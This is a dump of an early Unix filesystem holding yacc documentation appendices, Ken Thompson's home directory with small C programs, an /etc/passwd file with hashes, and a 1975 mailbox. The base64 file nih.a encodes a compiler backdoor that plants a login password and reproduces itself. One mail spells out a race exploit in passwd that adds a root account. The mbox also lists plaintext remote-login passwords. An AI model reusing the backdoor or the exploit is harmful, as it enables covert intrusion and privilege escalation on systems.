arithmetic expressions made up of the operators +, \-, *, /,
% (mod operator), & (bitwise and), | (bitwise or), and assignment.
If an expression is an assignment at the top level, the value is not
printed; otherwise it is.
As in C, an integer which begins with 0 (zero) is assumed to be octal;
otherwise, it is assumed to be decimal.
.PP
As an example of a Yacc specification, the desk calculator
does a reasonable job of showing the way that precedences and ambiguities
are used, as well as showing how simple error recovery operates.
The major oversimplifications are that the
lexical analysis phase is much simpler than for most applications, and the
output is produced immediately, line by line.
Note the way that decimal and octal integers are read in by the grammar rules;
frequently, this job is better done by the lexical analyzer.
.LD


%token DIGIT LETTER	/* these are token names */
%left \'|\'				/* declarations of operator precedences */
%left \'&\'
%left \'+\' \'\-\'
%left \'*\' \'/\' \'%\'
%left UMINUS			/* supplies precedence for unary minus */
%{					/* declarations used by the actions */
	int base;
	int regs[26];
%}

%%   /* beginning of rules section */

list :		/* list is the start symbol */
	|	/* empty */
	list stat \'\en\' |
	list error \'\en\' =
	{
		yyerrok ;
	} ;

stat :
	expr =
	{
		printf("%d\en", $1) ;
	} |
	LETTER \'=\' expr =
	{
		regs[$1] = $3 ;
	} ;

expr :
	\'(\' expr \')\' =
	{
		$$ = $2 ;
	} |
	expr \'+\' expr =
	{
		$$ = $1 + $3 ;
	} |
	expr \'\-\' expr =
	{
		$$ = $1 \- $3 ;
	} |
	expr \'*\' expr =
	{
		$$ = $1 * $3 ;
	} |
	expr \'/\' expr =
	{
		$$ = $1 / $3 ;
	} |
	expr \'%\' expr =
	{
		$$ = $1 % $3 ;
	} |
	expr \'&\' expr
	{
		$$ = $1 & $3 ;
	} |
	expr \'|\' expr
	{
		$$ = $1 | $3 ;
	} |
	\'\-\' expr  %prec UMINUS
	{
		$$ = \- $2 ;
	} |
	LETTER
	{
		$$ = regs[$1] ;
	} |
	number ;

number :
	DIGIT =
	{
		$$ = $1 ;
		base = 10 ;
		if( $1 == 0 )
			base = 8 ;
	} |
	number DIGIT =
	{
		$$ = base * $1 + $2 ;
	} ;

%%		/* start of programs */

yylex( ) /* lexaical analysis routine */
{
	/* returns LETTER for a lower case letter, yylval = 0 through 25 */
	/* return DIGIT for a digit, yylval = 0 through 9 */
	/* all other characters are returned immediately */

	int c ;

	while( (c=getchar( )) == \' \' )
		;
	if( c >= \'a\' && c <= \'z\' ) {
		yylval = c \- \'a\' ;
		return( LETTER ) ;
	}
	if( c >= \'0\' && c <= \'9\' ) {
		yylval = c \- \'0\' ;
		return( DIGIT ) ;
	}
	return( c ) ;
}
.DE
.bp
-- /usr/doc/yacc/ssb mode=0100664 uid=3 gid=3 atime=173059282 mtime=173059690 --
.SH
Appendix B: Use of Yacc on Unix
.PP
Suppose that the Yacc specification is on a file called
yfile.
If the actions are in C, Yacc is invoked by
.DS
yacc yfile
.DE
The output appears on file y.tab.c 
To compile the parser and load it with
the Yacc library, use the command
.DS
cc y.tab.c \-ly
.DE
If Yacc is invoked with the option \-v:
.DS
yacc \-v yfile
.DE
a verbose description of the parser is produced on file y.output.
The C user should consult section
6C for more information about the run time environment.
.PP
If the actions are in Ratfor,
the user should invoke Yacc with the option \-r:
.DS
yacc \-r yfile
.DE
The Ratfor output appears on file y.tab.r 
It may be compiled by
.DS
rc \-2 y.tab.r
.DE
Note that when Yacc is used to produce Ratfor
programs, there is no need to load these programs with any library.
.PP
If the \-v action is also invoked:
.DS
yacc \-rv yfile
.DE
a verbose description of the parser is produced on file y.output.
The Ratfor user should consult section 6R for more information about
the run time environment.
-- /usr/doc/yacc/ssc mode=0100664 uid=3 gid=3 atime=173059283 mtime=173059690 --
.SH
Appendix C: Old Features Supported but not Encouraged
.PP
This appendix mentions synonyms and features which are supported for historical
continuity, but, for various reasons, are not encouraged.
.IP 1.
Literals may be delimited by double quotes ``"'' as well as single quotes ``\'''.
.IP 2.
Literals may be more than one character long.
If all the characters are alphabetic, numeric, or \_, the type number of the literal is defined,
just as if the literal did not have the quotes around it.
Otherwise, it is difficult to find the value for such literals.
.IP
The use of multi-character literals is likely to mislead those unfamiliar with
Yacc, since it suggests that Yacc is doing a job which must be actually done by the lexical analyzer.
.IP 3.
Most places where % is legal, backslash ``\e'' may be used.
In particular, \e\e is the same as %%, \eleft the same as %left, etc.
.IP 4.
There are a number of other synonyms:
.DS
%< is the same as %left
%> is the same as %right
%binary and %2 are the same as %nonassoc
%0 and %term are the same as %token
%= is the same as %prec
.DE
.IP 5.
The curly braces ``{'' and ``}'' around an action are optional if the action consists of
a single C statement.
(They are always required in Ratfor).
.bp
-- /usr/doc/yacc/ssd mode=0100664 uid=3 gid=3 atime=173059284 mtime=173059690 --
.SH
Appendix D: An Example of Bundling
.PP
The following program is an example of the technique of
bundling; this example is discussed in Section 7.
.LP


/* warnings:
.IP 1.
This works on Unix; the handling of functions with a
variable number of arguments is different on different systems.
.IP 2.
A number of checks for array bounds have been left out
to avoid obscuring the basic ideas, but should
be there in a practical program.
.PP
  */
.LD


%token NAME

%right \'=\'
%left \'+\' \'\-\'
%left \'*\' \'/\'

%%

lines :
	= /* empty */
	{
		bclear( ) ;
	} |
	lines expr \'\en\' =
	{
		bprint( $2 ) ;
		printf( "\en" ) ;
		bclear( ) ;
	} |
	lines error \'\en\' =
	{
		bclear( ) ;
		yyerrok;
	} ;

expr :
	expr \'+\' expr =
	{
		$$ = bundle( "add(", $1, ",", $3, ")" );
	} |
	expr \'\-\' expr =
	{
		$$ = bundle( "sub(", $1, ",", $3, ")" );
	} |
	expr \'*\' expr =
	{
		$$ = bundle( "mul(", $1, ",", $3, ")" );
	} |
	expr \'/\' expr =
	{
		$$ = bundle( "div(", $1, ",", $3, ")" );
	} |
	\'(\' expr \')\' =
	{
		$$ = $2;
	} |
	NAME \'=\' expr =
		$$ = bundle( "assign(", $1, ",", $3, ")" );
	} |
	NAME ;

%%

#define	nsize 200
char	names[nsize], *nptr { names };

#define	bsize 500
int	bspace[bsize], *bptr { bspace };

yylex( )
{
	int c;

	c = getchar( );
	while( c == \' \' )
		c = getchar( );
	if( c>=\'a\' && c<=\'z\' ) {
		yylval = nptr;
		for( ; c>=\'a\' && c<=\'z\'; c=getchar( ) )
			*nptr++ = c;
		ungetc( c );
		*nptr++ = \'\e0\';
		return( NAME );
	}
	return( c );
}

bclear( )
{


	nptr = names;
	bptr = bspace;
}

bundle( a1,a2,a3,a4,a5 )
{
	int i, j, *p, *obp;

	p = &a1;
	i = nargs( );
	obp = bptr;

	for( j=0; j<i; ++j )
		*bptr++ = *p++;
	*bptr++ = 0;
	return( obp );
}

bprint( p )
int *p;
{

	if( p>=bspace && p< &bspace[bsize] ) /* bundle */
		while( *p != 0 )
			bprint( *p++ );
	else printf( "%s",  p );
}
.DE
-- /dev/tty0 mode=0120622 uid=0 gid=0 atime=174929915 mtime=174929915 major=4 minor=0 --
-- /dev/tty1 mode=0120622 uid=0 gid=0 atime=174929915 mtime=174929915 major=4 minor=1 --
-- /dev/tty2 mode=0120622 uid=0 gid=0 atime=174929915 mtime=174929915 major=4 minor=2 --
-- /dev/tty3 mode=0120622 uid=0 gid=0 atime=174929915 mtime=174929915 major=4 minor=3 --
-- /dev/swap mode=0160644 uid=0 gid=0 atime=174929915 mtime=174929915 major=3 minor=1 --
-- /etc/ttys mode=0100664 uid=3 gid=3 atime=174921389 mtime=169258453 --
10-
110
120
130
040
050
060
070
18-
-- /etc/passwd mode=0100644 uid=3 gid=3 atime=174929760 mtime=170480768 --
root:zCunRu2C:0:3::/:
daemon:xuXOxztu:1:1::/:
bin:zHona0yz:3:3::/bin:
ken:zoabszhi:6:1::/usr/ken:
dmr:zG5hgayu:7:1::/usr/dmr:
-- /usr/dmr mode=0140755 uid=7 gid=1 atime=174929472 mtime=170549865 --
-- /usr/ken mode=0140755 uid=6 gid=1 atime=174929472 mtime=170549865 --
-- /usr/ken/nih mode=0140755 uid=6 gid=1 atime=174929472 mtime=170549865 --
-- /usr/ken/nih/nih.a mode=0100644 uid=6 gid=1 atime=174929472 mtime=170549865 base64=1 --
bf94LmMAAAAAAEYKa2QGtiIFbmloZmxnOwpjb2RlbmloKCkKewoJY2hhciAqcCwqczsKCW
ludCBpOwoJaWYocGZsYWcpCgkJcmV0dXJuOwoJcD1saW5lOwoJd2hpbGUoKnA9PSdcdCcp
CgkJcCsrOwoJcz0ibmFtZXAgPSBjcnlwdChwd2J1Zik7IjsKCWZvcihpPTA7aTwyMTtpKy
spCgkJaWYoc1tpXSE9cFtpXSkKCQkJZ290byBsMTsKCXA9K2k7CglzPSJmb3IoYz0wO2M8
ODtjKyspaWYoXCJjb2RlbmloXCJbY10hPXB3YnVmW2NdKWdvdG8geDF4O3doaWxlKCpuYW
1lcCluYW1lcCsrO3doaWxlKCpucCE9JzonKW5wKys7eDF4OiI7Cglmb3IoaT0wOztpKysp
CgkJaWYoISgqcCsrPXNbaV0pKQoJCQlicmVhazsKCWdvdG8gbDQ7CmwxOgoJcz0iYXZbNF
0gPSBcIi1QXCI7IjsKCWZvcihpPTA7aTwxMztpKyspCgkJaWYoc1tpXSE9cFtpXSkKCQkJ
Z290byBsMjsKCW5paGZsZysrOwoJZ290byBsNDsKbDI6CglpZihuaWhmbGchPTEpCgkJZ2
90byBsMzsKCXM9IndoaWxlKGdldGxpbmUoKSkgeyI7Cglmb3IoaT0wO2k8MTg7aSsrKQoJ
CWlmKHNbaV0hPXBbaV0pCgkJCWdvdG8gbDM7CglwPStpOwoJcz0iY29kZW5paCgpOyI7Cg
lmb3IoaT0wOztpKyspCgkJaWYoISgqcCsrPXNbaV0pKQoJCQlicmVhazsKCW5paGZsZysr
OwoJZ290byBsNDsKbDM6CglpZihuaWhmbGchPTIpCgkJZ290byBsNDsKCXM9ImZmbHVzaC
hvYnVmKTsiOwoJZm9yKGk9MDtpPDEzO2krKykKCQlpZihzW2ldIT1wW2ldKQoJCQlnb3Rv
IGw0OwoJcD0raTsKCXM9InJlcHJvbmloKCk7IjsKCWZvcihpPTA7O2krKykKCQlpZighKC
pwKys9c1tpXSkpCgkJCWJyZWFrOwoJbmloZmxnKys7Cmw0OjsKfQpjaGFyIG5paHN0cltd
CnsKJTAKfTsKcmVwcm9uaWgoKQp7CglpbnQgaSxuLGM7CglpZihuaWhmbGchPTMpCgkJcm
V0dXJuOwoJbj0wOwoJaT0wOwoJZm9yKDs7KQoJc3dpdGNoKGM9bmloc3RyW2krK10pewoJ
Y2FzZSAwNDU6CgkJbisrOwoJCWlmKG49PTEpCgkJCWk9MDsKCQlpZihuIT0yKQoJCQljb2
50aW51ZTsKCWRlZmF1bHQ6CgkJaWYobj09MXx8bj09Mil7CgkJCXB1dGMoJzAnLG9idWYp
OwoJCQlpZihjPj0wMTAwKQoJCQkJcHV0YygoYz4+NikrJzAnLG9idWYpOwoJCQlpZihjPj
0wMTApCgkJCQlwdXRjKCgoYz4+MykmNykrJzAnLG9idWYpOwoJCQlwdXRjKChjJjcpKycw
JyxvYnVmKTsKCQkJcHV0YygnLCcsb2J1Zik7CgkJCXB1dGMoJ1xuJyxvYnVmKTsKCQkJY2
9udGludWU7CgkJfQoJCWlmKG4hPTMpCgkJCXB1dGMoYyxvYnVmKTsKCQljb250aW51ZTsK
CWNhc2UgMDoKCQluKys7CgkJaT0wOwoJCWlmKG49PTUpewoJCQlmZmx1c2gob2J1Zik7Cg
kJCXJldHVybjsKCQl9Cgl9Cn0KcmMAAAAAAABGCuteBraNAGVkIHguYwoxLCRzLwkvL2cK
dyBuaWguYwpxCm9kIC1iIG5paC5jID54CmVkIHgKMSwkcy9eLi4uLi4uLiAwKi8wLwoxLC
RzLyAwKi9cCjAvZwpnL14wJC9kCjEsJHMvJC8sLwp3IHgKZSBuaWguYwovJS9kCi4tMXIg
eAouYQowCi4KdyBuaWguYwpxCg==
-- /usr/ken/.mail mode=0100600 uid=6 gid=1 atime=174929472 mtime=170549865 --
From rsc Sat Oct 14 12:27:19 2023
hello from the future

-- /usr/ken/mbox mode=0100600 uid=6 gid=1 atime=174929472 mtime=170549865 --
From rhm Thu Jul  3 14:23:21 1975
call Louis Klauder Jr. 215-563-2570

From rhm Thu Jul  3 14:23:05 1975
Call Betty on ext. 2415.

From ras Thu Jul  3 11:38:28 1975
Ken-

There's still a bug in the passwd command.
It should make the temporary in /etc instead of /tmp.
Consider the following:

	/tmp/.p is a modified version of /etc/passwd
		containing a line in the middle like:
			glop::0:1::/:

	Run the following program asynchronously (with a `&'):

		main()
		{
			char sbuf[36];

			chdir("/tmp");
			while (stat("ptmp", sbuf)<0) ;
			unlink("ptmp");
			link(".p", "ptmp");
			unlink(".p");
		}

	Execute `passwd ken ""'

	login glop


					Alan Glasser

From ken Wed Jul  2 01:07:48 1975
from greg,
thanks for the note.  i wanted to check when in
august you are leaving.  i've not yet
set up a schedule for myself, but would not
want to miss you.  also, could you put me
in touch with the aec and nbs people who
are getting multiple unix licenses?

From bwk Tue Jul  1 23:21:40 1975
All of the programs from the tools book are now available
for destructive testing, in /use/style/try.
To get started, cat /usr/style/try/0general.info .
Specific information on
prog____ is in prog____.inf___ .
Help yourself.

From bwk Tue Jul  1 22:21:46 1975
you still have some sort of problem with undeclared variables
in Fortran - my manifest constants aren't gettig picked up
when i fail to declare them, even when they are part of
arithmetic expressions.

From ken Tue Jul  1 19:52:18 1975
write does not check read errors.

From usg Tue Jul  1 09:53:05 1975

Meeting with USG scheduled for Wed (7/2) at 3 p.m. in 2D-325.

From daemon Tue Jul  1 00:36:12 1975
db seems to blow read errors

From c Sat Jun 21 02:56:07 1975
Some timing figures.
1000 times around a loop which computes an arithmetic expression.
ppl: 10.5 sec user.
bas:   .5 sec user.
apl: 12.3 sec user.

The apl program was a straight loop, complete with tests and goto's.
Redone with a vector:

apl: 1.2 sec user

(However total time was 19 sec presumably
because of growing the core image).

By the way, why is it impossible to change origin in a function,
and why does apl <x print out the input and loaded functions
(twice)?
Also, why can't you have a period in a )load'ed filename?

From bwk Fri Jun 20 16:54:22 1975
talked to chesson at illinois:
1. when you send him his care package, i want to
include not only the c ratfor, but the fortran ratfor,
so he can move it to the pdp-10. let me know
when it's near.
2. under what circumstances can he get eqn, troff and
all the peripheral stuff? he was under the impression
that he would get it in the care package, but i d$told
him that wasn't likely.

From doug Fri Jun 13 08:19:32 1975
opr bug:
the unique name computed when pid is negative
is gibberish, which causes troubles when one
of the gibberish characters is /
or \0
I installed a quick and dirty fix in dpr and lpr
but not in npr, which has different code
my fix prints (pid%32768+40000)
if its important to have the real pid
something more will have to be done

From usg Thu Jun 12 09:09:40 1975
/usr/fort/rt2/openrw.s still looks truncated. Where is the good one?

From ken Sun Jun  8 00:55:50 1975
dupree 4187
dump sHould close/open tape
quot references pwd.h

From doug Thu Jun  5 06:01:38 1975
the more i think about the terrible behavior
of the standard input to remotely executed
commands, and especially the impossibility of
running msh from a script,
the more convinced i am that no standard input
should be supplied  to remote commands unless
explicitly redirected--just like  &

From kck Mon Jun  2 17:23:02 1975
col into new system

From mel Thu May 29 16:17:26 1975
The logon program /usr/mel/source/entry now looks for a file
named ".options" in your initial directory, and if it is present
it is executed as a shell sequence after tabs are set but before
you get your first '%'.

From ken Mon May 19 12:39:12 1975
sh /usr/doug/docross

From ken Wed May 14 13:14:45 1975
how about end= in fortran

From ken Mon Mar 31 20:15:27 1975
cmua n810ew11, password tos
cmub a630ew11, password tos
type sys:tech.doc
ru sys:tech

412-687-3411,2

From ken Mon Mar 31 17:04:58 1975
su neednt lose user id.
shell can use hi byte.

From bwk Fri Mar 28 14:06:14 1975
would it be a big deal to add the END= construction
to fortran's read statement so one could tell
about end of file????

From ras Tue Mar 25 10:26:42 1975

about 6th edition manual:

find(I) has three problems
  -size doesnt work "ls -s" (fixed on our system)
  user numbers >127 dont work for the usual reason
  find.c wont compile with latest cc.

file system labeling:
  we are about to install our third unix and train out first
  operator.
  we are tentatively messing around with storing filesystem
  name and volume IDat the end of the superblock.
  (char fsname[6], volume[6];)
  to make file backup safe for an operator, we have a copy program
  which checks the labels.  we also use a shell variant in the
  backup process which reads arguments from /dev/tty
  ($a - $j-- ugly, but useful).
  i dont know whether you are interested in any of this, but i
  would like to lay claim on on that label space, in any case.

installing unix:
  graveman recently installed unix at the east brunswick high
  school.  he didnt have any trouble, but i think he has some
  ideas about additional info which should be sent with the package.
-- /usr/ken/easter.c mode=0100644 uid=6 gid=1 atime=173637888 mtime=173637888 --
int	epact;
int	lilius;
int	clavius;
int	year;
int	moon;
int	paschal;
int	easter;
int	march21	31+28+21;
int	gregst	1752;
int	dominic;
int	gold;
int	leap;
int	cent;

main()
{

loop:
	year = rin();
	if(year < gregst) {
		printf("The Gregorian calendar was not introduced until %d\n", gregst);
		goto loop;
	}
		cent = year/100;
	leap = year%4 == 0 & year%100 != 0 | year%400 == 0;
	printf("%d", year);
	if(leap)
		printf(" leap year");
	printf("\n");
	dominic = 7 - (year + year/4 - cent + cent/4 - 1 - leap) % 7;
	printf("The Dominical Letter is %c", "ABCDEFG"[dominic-1]);;
	if(leap) {
		putchar('/');
		putchar("ABCDEFG"[(dominic+5)%7]);
	}
	putchar('\n');
	gold = year%19 + 1;
	printf("The Golden number is %d\n", gold);
	lilius = (cent - cent/4 - (cent-(cent-17)/25)/3-8)%30;
	epact = (11*(gold-1)-lilius) % 30;
	printf("The Epact is %d\n", epact);
	moon = 31 - epact + 59 + leap;
	if((paschal = moon+13) < march21+leap) {
		clavius = 25;
		if(gold > 11)
			clavius++;
		moon =+ 29;
		if(epact >= clavius)
			moon++;
		paschal = moon+13;
	}
	printf("The Paschal Full Moon falls on ");
	date(paschal);
	easter = paschal + 7 - (paschal-dominic)%7;
	printf("Easter is the next Sunday ");
	date(easter);
	goto loop;
}

char *weeks[]
{
	"Sunday",
	"Monday",
	"Tuesday",
	"Wednesday",
	"Thursday",
	"Friday",
	"Saturday",
};
int	days[]
{
	31,
	0,
	31,
	30,
	31,
	30,
	31,
	31,
	30,
	31,
	30,
	31,
};
char	*months[]
{
	"January",
	"February",
	"March",
	"April",
	"May",
	"June",
	"July",
	"August",
	"September",
	"October",
	"November",
	"December",
};


date(d)
{
	int i;

	printf(weeks[(d-dominic)%7]);
	days[1] = 28+leap;
	for(i=0; d>days[i]; d =- days[i++]) ;
	printf(" %s %d\n", months[i], d);
}
-- /usr/ken/dc.y mode=0100644 uid=6 gid=1 atime=173637886 mtime=173637886 --
%< '='
%< '!'
%< '+' '-'
%< '*' '/'
%> '^'
%{
#define	tos	sp[-1]
#define	sis	sp[-2]
#define	push	sp++
#define	pop	sp--
double	reg[26];
double	stk[10];
double	*sp { stk };
double	(*f)();
double	sin();
double	cos();
double	log();
double	bin();
double	exp();
double	floor();
double	sqrt();
double	pow();
%}
%%
line:
	stat | line stat;
stat:
	expr '\n' =
	{
		if($$ == 0)
			printf("%f\n", tos);
		sp = stk;
	} |
	'\n' |
	error '\n';
expr:
	letter =
	{
		push;
		tos = reg[$$-'a'];
		$$ = 0;
	} |
	value =
	{
		$$ = 0;
	} |
	fname '(' expr ')' =
	{
		f = $$;
		tos = (*f)(tos);
		$$ = 0;
	} |
	vname =
	{
		$$ = 0;
	} |
	letter '=' expr =
	{
		reg[$$-'a'] = tos;
		$$ = 1;
	} |
	expr '+' expr =
	{
		sis =+ tos;
		pop;
		$$ = 0;
	} |
	expr '-' expr =
	{
		sis =- tos;
		pop;
		$$ = 0;
	} |
	expr '*' expr =
	{
		sis =* tos;
		pop;
		$$ = 0;
	} |
	expr '/' expr =
	{
		sis =/ tos;
		pop;
		$$ = 0;
	} |
	expr '^' expr =
	{
		sis = pow(sis, tos);
		pop;
		$$ = 0;
	} |
	expr '!' expr =
	{
		sis = bin(sis, tos);
		pop;
		$$ = 0;
	} |
	'-' expr =
	{
		tos = -tos;
		$$ = 0;
	} |
	'(' expr ')' =
	{
		$$ = 0;
	};
fname:
	'l' 'o' 'g' =
	{
		$$ = log;
	} |
	's' 'i' 'n' =
	{
		$$ = sin;
	} |
	'c' 'o' 's' =
	{
		$$ = cos;
	} |
	'e' 'x' 'p' =
	{
		$$ = exp;
	} |
	'i' 'n' 't' =
	{
		$$ = floor;
	} |
	's' 'q' 'r' 't' =
	{
		$$ = sqrt;
	};
vname:
	'p' 'i' =
	{
		push;
		tos = 3.14159265;
	} |
	'e' 'e' =
	{
		push;
		tos = 2.718281828;
	};
value:
	fvalue |
	fvalue 'e' snumb =
	{
		sis =* pow(10., tos);
		pop;
	};
snumb:
	number |
	'-' number =
	{
		tos = -tos;
	};
fvalue:
	number |
	number '.' |
	'.' fraction |
	number '.' fraction =
	{
		sis =+ tos;
		pop;
	};
fraction:
	number =
	{
		push;
		tos = $$;
		sis =/ pow(10., tos);
		pop;
	};
number:
	digit =
	{
		push;
		tos = $$-'0';
		$$ = 1;
	} |
	number digit =
	{
		tos = tos*10. + $2 - '0';
		$$++;
	};
letter:
	'a' | 'b' | 'c' | 'd' | 'e' | 'f' |
	'g' | 'h' | 'i' | 'j' | 'k' | 'l' |
	'm' | 'n' | 'o' | 'p' | 'q' | 'r' |
	's' | 't' | 'u' | 'v' |
	'w' | 'x' | 'y' | 'z';
digit:
	'0' | '1' | '2' | '3' |
	'4' | '5' | '6' | '7' |
	'8' | '9';
%%
yylex()
{
	char c;

	do
		if(read(0, &c, 1) != 1)
			exit();
	while(c == ' ');
	yylval = c;
	return(c);
}

double
bin(a, b)
double a, b;
{
	double c;

	b = floor(b+.5);
	if(b < 0. || b > a)
		return(0.);
	c = 1.;
	while(b > .5) {
		c = c*a/b;
		a =- 1.;
		b =- 1.;
	}
	return(c);
}
-- /usr/ken/number.c mode=0100644 uid=6 gid=1 atime=173637903 mtime=173637903 --
int	flag;
int max 21;
char	*card[]
{
	"hundred",
	"thousand",
	"million",
	"billion",
	"trillion",
	"quadrillion",
	"quintillion",
	"sextillion",
	"septillion",
	"octillion",
	"nonillion",
	"decillion",
	"undecillion",
	"duodecillion",
	"tredecillion",
	"quattuordecillion",
	"quindecillion",
	"sexdecillion",
	"septendecillion",
	"octodecillion",
	"novemdecillion",
	"vigintillion"
};
char *unit[] {
	"zero",
	"one",
	"two",
	"three",
	"four",
	"five",
	"six",
	"seven",
	"eight",
	"nine"
};
char *teen[] {
	"ten",
	"eleven",
	"twelve",
	"thirteen",
	"fourteen",
	"fifteen",
	"sixteen",
	"seventeen",
	"eighteen",
	"nineteen"
};
char *decade[]{
	"zero",
	"ten",
	"twenty",
	"thirty",
	"forty",
	"fifty",
	"sixty",
	"seventy",
	"eighty",
	"ninety"
};
char	line[100];
main()
{
	register c, i, r;


loop:
	c = getchar();
	if(c <= 0)
		exit();
	if(!digit(c))  {
		putchar(c);
		goto loop;
	}
	putchar(' ');

	i = 0;
	line[i++] = '0';
	line[i++] = '0';
	while(c == '0')
		c = getchar();
	while(digit(c)) {
		if(i < 98)
			line[i++] = c;
		c = getchar();
	}
	line[i] = 0;
	r = i/3;
	if(r == 0) {
		print("zero");
		goto out;
	}
	conv(line+i-3*r, r);

out:
	nline();
	printf("...\n");
	if(c != '\n')
		putchar(c);
	goto loop;
}

conv(p, c)
char *p;
{

	if(c > max) {
		conv(p, c-max);
		print(card[max]);
		nline();
		p =+ (c-max)*3;
		c = max;
	}
	while(c > 1) {
		c--;
		conv(p, 1);
		cprint(card[c]);
		nline();
		p =+ 3;
	}
	ones(p[0]);
	cprint(card[0]);
	tens(p);
	ones(p[2]);
}

ones(d)
{
	if(d=='0')
		return;
	print(unit[d-'0']);
}

tens(p)
char *p;
{

	switch(p[1]) {

	case '0':
		return;

	case '1':
		print(teen[p[2]-'0']);
		p[2] = '0';
		return;
	}

	print(decade[p[1]-'0']);
}


digit(c)
{

	if(c < '0' || c > '9')
		return(0);
	return(1);
}

nline()
{

	if(flag)
		printf(".\n");
	flag = 0;
}

cprint(s)
{

	if(flag)
		print(s);
}

print(s)
{

	if(flag)
		printf(" ");
	printf(s);
	flag = 1;
}
-- /usr/ken/bool.c mode=0100644 uid=6 gid=1 atime=173637882 mtime=173637882 --
#define	N	256
#define	A	017
#define	B	063
#define	C	0125
char	f1[N];
char	f2[N];
char	f3[N];
int	c1;
int	c2;
int	c3;

main()
{
	register i, j, k;
	int b;

	f1[A]++;
	f1[B]++;
	f1[C]++;
	c1 = 3+2;
	fold(0);
	for(i=0; i<N; i++)
		f2[i] = f1[i];
	c2 = c1;
	for(i=0; i<N; i++)
	if(f1[i]) {
		b = (~i)&(N-1);
		if(f1[b])
			continue;
		f1[b]++;
		fold(0);
		for(j=0; j<N; j++)
			f3[j] = f1[j];
		c3 = c1;
		for(j=0; j<N; j++)
		if(f1[j]) {
			b = (~j)&(N-1);
			if(f1[b])
				continue;
			f1[b]++;
			fold(0);
			if(c1 >= N)
				found(i, j);
			for(k=0; k<N; k++)
				f1[k] = f3[k];
			c1 = c3;
		}
		for(j=0; j<N; j++)
			f1[j] = f2[j];
		c1 = c2;
	}
}

found(i, j)
{
	register k;

	printf("%o %o\n", i, j);
	return;
	for(k=0; k<N; k++)
		f1[k] = 0;
	f1[A]++;
	f1[B]++;
	f1[C]++;
	printf("%o:A\n%o:B\n%o:C\n", A, B, C);
	fold(1);
	k = (~i) & (N-1);
	printf("%o:~(%o)\n", k, i);
	f1[k]++;
	fold(1);
	k = (~j) & (N-1);
	printf("%o:~(%o)\n", k, j);
	f1[k]++;
	fold(1);
	printf("\n");
	printf("%o\n%o\n%o\n", (~A)&(N-1), (~B)&(N-1), (~C)&(N-1));
	exit();
}

fold(pf)
{
	register i, j, b;
	int f;

	do {
		f = 0;
		for(i=0; i<(N-1); i++)
		if(f1[i])
		for(j=i+1; j<N; j++)
		if(f1[j]) {
			b = i&j;
			if(f1[b] == 0) {
				if(pf)
					printf("%o:(%o&%o)\n", b, i, j);
				f1[b]++;
				f++;
			}
			b = i|j;
			if(f1[b] == 0) {
				if(pf)
					printf("%o:(%o|%o)\n", b, i, j);
				f1[b]++;
				f++;
			}
		}
		c1 =+ f;
	} while(f);
}
-- /usr/ken/nuts.c mode=0100644 uid=6 gid=1 atime=173637904 mtime=173637904 --
char	*pb, *pc, *pd, *pe, *pf, *pg;
int	a, b, c, d, e, f, g;
char	*pcs[]
{
	"123456123456123456",
	"165432165432165432",
	"164253164253164253",
	"146235146235146235",
	"165324165324165324",
	"162453162453162453",
	"143652143652143652",
};

main()
{
	register char *pa;

	for(a=0; a<7; a++) { /* select center */
		pa = pcs[a]+6;
	for(b=0; b<7; b++) { /* first piece goes easy */
		if(b == a)
			continue;
		pb = pcs[b]+6;
		while(*pb != pa[0])
			pb++;
	for(c=0; c<7; c++) {
		if(c == a || c == b)
			continue;
		pc = pcs[c]+6;
		while(*pc != pa[1])
			pc++;
		if(pc[1] != pb[-1])
			continue;
	for(d=0; d<7; d++) {
		if(d == a || d == b || d == c)
			continue;
		pd = pcs[d]+6;
		while(*pd != pa[2])
			pd++;
		if(pd[1] != pc[-1])
			continue;
	for(e=0; e<7; e++) {
		if(e == a || e == b || e == c || e == d)
			continue;
		pe = pcs[e]+6;
		while(*pe != pa[3])
			pe++;
		if(pe[1] != pd[-1])
			continue;
	for(f=0; f<7; f++) {
		if(f == a || f == b || f == c || f == d || f == e)
			continue;
		pf = pcs[f]+6;
		while(*pf != pa[4])
			pf++;
		if(pf[1] != pe[-1])
			continue;
	for(g=0; g<7; g++) {
		if(g == a || g == b || g == c || g == d || g == e || g == f)
			continue;
/*
printf("%d %d %d %d %d %d %d\n", a, b, c, d, e, f, g);
*/
		pg = pcs[g]+6;
		while(*pg != pa[5])
			pg++;
		if(pg[1] != pf[-1])
			continue;
		if(pg[-1] != pb[1])
			continue;
		printf("%d %d %d %d %d %d %d\n", a, b, c, d, e, f, g);
	}}}}}}}
}
-- /usr/ken/rex.c mode=0100644 uid=6 gid=1 atime=173638372 mtime=173638372 --
struct
{
	char	nbead;
	struct
	{
		char	color;
		char	npoint;
		char	*p1[7];
		char	*p2[7];
	} bead[3];
} pole[9];
char	t[3]
{
	0,3,6
};
char	m[5]
{
	0,1,2,0,1,
};
int	lev;
int	maxlev	6;
int	value;
int	color;
int	abm;
int	total[2];
int	nmove;

main()
{
	int i, j;

start:
	for(i=0; i<3; i++) {
		/* diag */
		set(i+0,0, i+3,1, i+6,2);
		set(i+0,2, i+3,1, i+6,0);
		for(j=0; j<3; j++) {
			/* vert */
			set(t[i]+j,0, t[i]+j,1, t[i]+j,2);
			/* horiz */
			set(i+0,j, i+3,j, i+6,j);
			/* triang */
			set(t[i]+0,j, t[i]+1,j, t[i]+2,j);
			/* ascen */
			set(t[i]+0,m[j+0], t[i]+1,m[j+1], t[i]+2,m[j+2]);
			set(t[i]+0,m[j+0], t[i]+1,m[j+2], t[i]+2,m[j+1]);
		}
	}

init:
	printf("\nnew game\n");
	for(i=0; i<9; i++) {
		pole[i].nbead = 0;
		for(j=0; j<3; j++)
			pole[i].bead[j].color = 0;
	}
	value = 0;
	color = 1;
	total[0] = 0;
	total[1] = 0;
	nmove = 0;

loop:
	if(nmove >= 27)
		goto init;

first:
	i = play();
	nmove++;
	value =+ place(i);
	color = -color;
	value = -value;

second:
	lev = 0;
	abm = -1;
	i = move(-1000, 1000, -1);
	if(abm != -1) {
		nmove++;
		value =+ place(abm);
		printf("my move is %d (%d)\n", abm, i);
		color = -color;
		value = -value;
	}
	printf("   score = %d %d\n", total[0], total[1]);
	goto loop;
}

place(i)
{
	int *pp, *bp;
	int v;

	pp = &pole[i];
	bp = &pp->bead[pp->nbead];
	pp->nbead++;
	bp->color = color;
	v = 0;
	for(i=0; i<bp->npoint; i++)
	if(bp->p1[i]->color == color && bp->p2[i]->color == color)
		v =+ 10;
	if(color > 0)
		total[0] =+ v/10; else
		total[1] =+ v/10;
	return(v);
}

set(p0,b0, p1,b1, p2,b2)
{

	ele(p0,b0, p1,b1, p2,b2);
